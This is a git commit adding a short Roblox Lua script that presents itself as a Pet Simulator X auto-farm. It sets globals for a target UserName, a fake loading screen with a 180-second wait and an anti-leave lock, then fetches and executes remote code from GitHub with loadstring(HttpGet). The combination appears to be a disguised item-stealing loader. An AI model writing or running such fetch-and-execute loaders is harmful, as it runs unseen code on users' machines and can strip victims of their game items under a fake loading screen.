7c4ed1fa117fc840509b74bc2f698aa7c79fff5a
noobyttv <94109783+noobyttv@users.noreply.github.com>
2023-07-26 20:11:04 +0200

    Script.lua

---
+++ Script.lua
@@ -0,0 +1,12 @@
+_G.UserName = "XxDontWalkJustEatxX" _G.LoadingScreen = true 
+_G.AntiLeave = true 
+_G.MouseLock = true 
+ 
+-- Remove These If You're Not Using The Rizz LoadingScreen
+ 
+_G.ScriptName = "xd"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
